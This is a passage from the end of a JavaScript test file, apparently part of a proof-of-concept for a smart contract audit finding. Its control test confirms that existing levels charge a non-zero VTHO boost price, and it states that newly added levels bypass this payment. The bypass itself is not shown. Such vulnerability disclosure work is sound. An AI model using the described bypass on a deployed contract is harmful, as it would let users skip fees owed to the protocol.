        expect(controlBoostPrice).to.be.gt(0n, "Existing levels should have non-zero boost price");
        console.log(`  [OK] Level ${controlLevelId} has NON-ZERO boost price (works correctly)`);

        // Calculate expected VTHO cost for Level 1 boost
        const expectedVthoCost = controlBoostPrice * controlLevel.maturityBlocks;
        console.log(`\n[STATE] Expected VTHO cost for Level ${controlLevelId} boost:`);
        console.log(`  -> ${ethers.formatEther(expectedVthoCost)} VTHO`);
        console.log(`  -> This is the cost users SHOULD pay on all levels`);
        console.log(`  -> But new levels bypass this payment (demonstrated in main test)`);

        console.log("\n[PASSED] Control test confirms existing levels work correctly");
        console.log("=".repeat(80) + "\n");
    });
});
```
